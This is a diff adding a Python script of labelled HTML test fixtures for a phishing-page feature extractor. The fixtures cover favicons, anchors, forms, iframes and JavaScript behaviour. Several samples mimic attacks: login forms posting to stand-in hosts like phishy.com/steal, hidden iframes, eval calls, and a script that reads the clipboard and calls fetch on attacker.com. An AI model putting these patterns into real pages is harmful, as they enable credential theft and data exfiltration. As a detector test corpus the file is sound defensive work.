@@ -1,0 +1,460 @@
+import os
+
+
+
+def get_project_root():
+    return os.path.abspath(
+        os.path.join(os.path.dirname(__file__), "..", "..", "..", "..")
+    )
+
+PROJECT_ROOT = get_project_root()
+
+
+
+
+
+
+FAVICON_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "favicon_test")
+ANCHOR_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "anchor_test")
+LINKS_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "links_test")
+REQUEST_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "request_url_test")
+SFH_DIR = os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "sfh_test")
+IFRAME_DIR=os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "iframe_test")
+JS_DIR=os.path.join(PROJECT_ROOT, "features_extraction", "stage3_html", "tests", "data", "JS_test")
+
+
+
+favico_test_cases = {
+    "test_favicon_legit.html": """
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="icon" href="https://example.com/favicon.ico" type="image/x-icon">
+    <title>Legitimate Favicon Test</title>
+</head>
+<body>
+    <h1>Legit Favicon</h1>
+</body>
+</html>
+""",
+    "test_favicon_sus.html": """
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <title>Suspicious (Safe External) Favicon Test</title>
+</head>
+<body>
+    <h1>Suspicious Favicon</h1>
+</body>
+</html>
+""",
+    "test_favicon_phish.html": """
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="icon" href="https://malicious-site.bad/favicon.png" type="image/png">
+    <title>Phishing Favicon Test</title>
+</head>
+<body>
+    <h1>Phishing Favicon</h1>
+</body>
+</html>
+""",
+    "test_favicon_phish_invalid_ext.html": """
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="icon" href="https://badactor.com/favicon.jpg" type="image/jpeg">
+    <title>Phishing Favicon Test - Invalid Extension</title>
+</head>
+<body>
+    <h1>Phishing Invalid Extension</h1>
+</body>
+</html>
+""",
+    "test_favicon_none.html": """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>No Favicon Test</title>
+</head>
+<body>
+    <h1>No favicon</h1>
+</body>
+</html>
+""",
+}
+anchor_test_cases = {
+    "test_anchor_legit.html": """
+    <html><body>
+        <a href="https://example.com/page1">Internal</a>
+        <a href="https://example.com/page2">Internal</a>
+        <a href="https://example.com/page3">Internal</a>
+    </body></html>
+    """,
+
+    "test_anchor_suspicious.html": """
+    <html><body>
+        <a href="https://example.com/page1">Internal</a>
+        <a href="#">Hash</a>
+        <a href="javascript:void(0);">JS</a>
+    </body></html>
+    """,
+
+    "test_anchor_phish.html": """
+    <html><body>
+        <a href="https://badsite1.com">Phish</a>
+        <a href="https://badsite2.com">Phish</a>
+        <a href="https://example.com/page">Legit</a>
+    </body></html>
+    """,
+
+    "test_anchor_empty.html": """
+    <html><body>
+        <h1>No anchors here</h1>
+    </body></html>
+    """,
+
+    "test_anchor_mixed.html": """
+    <html><body>
+        <a href="https://example.com/page1">Legit</a>
+        <a href="https://evil.com">Phish</a>
+        <a href="#">Hash</a>
+    </body></html>
+    """,
+}
+link_test_cases = {
+    "test_links_legit.html": """
+<html>
+<head>
+    <link href="https://example.com/style.css" rel="stylesheet">
+    <script src="https://example.com/script.js"></script>
+    <meta content="https://example.com/og.png">
+</head>
+<body><h1>Legit</h1></body>
+</html>
+""",
+    "test_links_suspicious.html": """
+<html>
+<head>
+    <link href="https://example.com/style.css" rel="stylesheet">
+    <script src="https://cdn.somecdn.com/script.js"></script>
+    <meta content="https://example.com/og.png">
+</head>
+<body><h1>Suspicious</h1></body>
+</html>
+""",
+    "test_links_phish.html": """
+<html>
+<head>
+    <link href="https://evil.com/style.css" rel="stylesheet">
+    <script src="https://phish.com/script.js"></script>
+    <meta content="https://tracker.com/meta.png">
+</head>
+<body><h1>Phish</h1></body>
+</html>
+""",
+    "test_links_empty.html": """
+<html>
+<head><title>Empty</title></head>
+<body><h1>No resources</h1></body>
+</html>
+""",
+}
+request_test_cases = {
+    "test_request_legit.html": """
+<html>
+<body>
+    <img src="https://example.com/img.png">
+    <audio src="https://example.com/sound.mp3"></audio>
+    <iframe src="https://example.com/embed.html"></iframe>
+    <source src="https://example.com/video.mp4">
+</body>
+</html>
+""",
+    "test_request_mixed.html": """
+<html>
+<body>
+    <img src="https://example.com/logo.png">
+    <iframe src="https://malicious.com/track.html"></iframe>
+    <video src="https://example.com/video.mp4"></video>
+    <source src="https://cdn.cdncdn.com/script.js"></source>
+</body>
+</html>
+""",
+    "test_request_phish.html": """
+<html>
+<body>
+    <img src="https://badsite.com/img.png">
+    <audio src="https://trackers.com/sound.mp3"></audio>
+    <iframe src="https://phishing.net/embed.html"></iframe>
+    <source src="https://malicious.net/v.js"></source>
+</body>
+</html>
+""",
+    "test_request_empty.html": """
+<html>
+<body>
+    <h1>No resources requested</h1>
+</body>
+</html>
+""",
+}
+sfh_test_cases= {
+    # Original batch
+    "test_sfh_legit.html": """
+<html><body>
+    <form action="https://example.com/submit"></form>
+</body></html>
+""",
+    "test_sfh_suspicious.html": """
+<html><body>
+    <form action="#"></form>
+</body></html>
+""",
+    "test_sfh_phish.html": """
+<html><body>
+    <form action="http://phishy.com/post"></form>
+</body></html>
+""",
+    "test_sfh_about_blank.html": """
+<html><body>
+    <form action="about:blank"></form>
+</body></html>
+""",
+    "test_sfh_empty_action.html": """
+<html><body>
+    <form action=""></form>
+</body></html>
+""",
+    "test_sfh_multiple_forms.html": """
+<html><body>
+    <form action="https://example.com/ok"></form>
+    <form action="#"></form>
+    <form action="http://bad.com/send"></form>
+</body></html>
+""",
+    "test_sfh_all_legit_forms.html": """
+<html><body>
+    <form action="https://example.com/1"></form>
+    <form action="https://example.com/2"></form>
+    <form action="https://example.com/3"></form>
+</body></html>
+""",
+    "test_sfh_all_phishy_forms.html": """
+<html><body>
+    <form action="http://evil.com/1"></form>
+    <form action="http://phish.com/2"></form>
+</body></html>
+""",
+    "test_sfh_no_forms.html": """
+<html><body>
+    <h1>No forms on this page</h1>
+</body></html>
+""",
+
+    # Extended/Upgraded batch
+    "test_sfh_login_keywords_legit.html": """
+<html><body>
+    <form action="https://example.com/submit">
+        <input type="text" name="username">
+        <input type="password" name="pass">
+    </form>
+</body></html>
+""",
+    "test_sfh_login_keywords_suspicious.html": """
+<html><body>
+    <form action="#">
+        <input type="text" name="login">
+        <input type="password" name="password">
+    </form>
+</body></html>
+""",
+    "test_sfh_login_keywords_phish.html": """
+<html><body>
+    <form action="http://phishy.com/steal">
+        <input type="text" name="email">
+        <input type="password" name="pass">
+    </form>
+</body></html>
+""",
+    "test_sfh_mixed_forms.html": """
+<html><body>
+    <form action="https://example.com">
+        <input type="text" name="user">
+    </form>
+    <form action="#">
+        <input type="text" name="login">
+        <input type="password" name="password">
+    </form>
+</body></html>
+""",
+    "test_sfh_blank_action_only.html": """
+<html><body>
+    <form action="">
+        <input type="text" name="user">
+    </form>
+</body></html>
+""",
+    "test_sfh_keyword_only.html": """
+<html><body>
+    <form action="https://example.com/submit">
+        <input type="text" name="login">
+    </form>
+</body></html>
+""",
+    "test_sfh_password_only.html": """
+<html><body>
+    <form action="https://example.com/submit">
+        <input type="password" name="pass">
+    </form>
+</body></html>
+""",
+    "test_sfh_legit_and_suspicious.html": """
+<html><body>
+    <form action="https://example.com">
+        <input type="text" name="user">
+    </form>
+    <form action="">
+        <input type="password" name="auth">
+    </form>
+</body></html>
+""",
+    "test_sfh_keyword_password_action.html": """
+<html><body>
+    <form action="#">
+        <input type="password" name="password">
+        <input type="text" name="login">
+    </form>
+</body></html>
+"""
+}
+iframe_test_cases = {
+    "test_iframe_legit.html": """
+<html><body>
+    <iframe src="https://example.com/embedded.html" style="border: 1px solid black;" width="500" height="300" sandbox></iframe>
+</body></html>
+""",
+    "test_iframe_hidden.html": """
+<html><body>
+    <iframe src="https://example.com/embedded.html" style="display:none" width="500" height="300"></iframe>
+</body></html>
+""",
+    "test_iframe_zero_size.html": """
+<html><body>
+    <iframe src="https://example.com/embedded.html" width="0" height="0"></iframe>
+</body></html>
+""",
+    "test_iframe_external.html": """
+<html><body>
+    <iframe src="https://phish.com/steal.html" width="600" height="400" sandbox></iframe>
+</body></html>
+""",
+    "test_iframe_nosandbox.html": """
+<html><body>
+    <iframe src="https://phish.com/form.html" width="600" height="400"></iframe>
+</body></html>
+""",
+    "test_iframe_srcdoc_keywords.html": """
+<html><body>
+    <iframe srcdoc="<h1>Enter your password</h1><script>alert('fake')</script>" sandbox></iframe>
+</body></html>
+""",
+    "test_iframe_complex_phish.html": """
+<html><body>
+    <iframe src="https://bad.com/iframe.html" style="visibility:hidden" width="0" height="0" srcdoc="auth user login <script>javascript:eval('phish')</script>"></iframe>
+</body></html>
+""",
+    "test_iframe_no_iframes.html": """
+<html><body>
+    <h1>No iframes here</h1>
+</body></html>
+""",
+"test_iframe_safe_srcdoc.html": """
+<html><body>
+    <iframe srcdoc="<p>Welcome to our site!</p>" width="500" height="300" sandbox></iframe>
+</body></html>
+"""
+}
+js_behavior_test_cases = {
+    "test_js_legit.html": """
+<html><body>
+    <script>
+        console.log("Welcome to our site!");
+    </script>
+</body></html>
+""",
+    "test_js_eval.html": """
+<html><body>
+    <script>
+        eval("alert('Hacked!')");
+    </script>
+</body></html>
+""",
+    "test_js_new_function.html": """
+<html><body>
+    <script>
+        var fn = new Function("alert('Danger!')");
+    </script>
+</body></html>
+""",
+    "test_js_document_write.html": """
+<html><body>
+    <script>
+        document.write("<h1>Phishing</h1>");
+    </script>
+</body></html>
+""",
+    "test_js_onmouseover.html": """
+<html><body>
+    <script>
+        var x = '<div onmouseover="stealCookies()">hover me</div>';
+    </script>
+</body></html>
+""",
+    "test_js_settimeout_string.html": """
+<html><body>
+    <script>
+        setTimeout("steal()", 2000);
+    </script>
+</body></html>
+""",
+    "test_js_window_location.html": """
+<html><body>
+    <script>
+        window.location = "http://phish.com";
+    </script>
+</body></html>
+""",
+    "test_js_innerhtml.html": """
+<html><body>
+    <script>
+        document.getElementById("target").innerHTML = "<b>Injected</b>";
+    </script>
+</body></html>
+""",
+    "test_js_clipboard_fetch.html": """
+<html><body>
+    <script>
+        navigator.clipboard.readText();
+        fetch("http://attacker.com/data");
+    </script>
+</body></html>
+""",
+    "test_js_external_script.html": """
+<html><head>
+    <script src="https://evil.com/script.js"></script>
+</head><body></body></html>
+"""
+}
+
+
+if __name__ == "__main__":
+        os.makedirs(SFH_DIR, exist_ok=True)
+        for filename, content in sfh_test_cases.items():
+            path = os.path.join(SFH_DIR, filename)
+            with open(path, "w", encoding="utf-8") as f:
+                f.write(content.strip())
+
+        print(f"✅ All  test HTML files created under tests/data/")
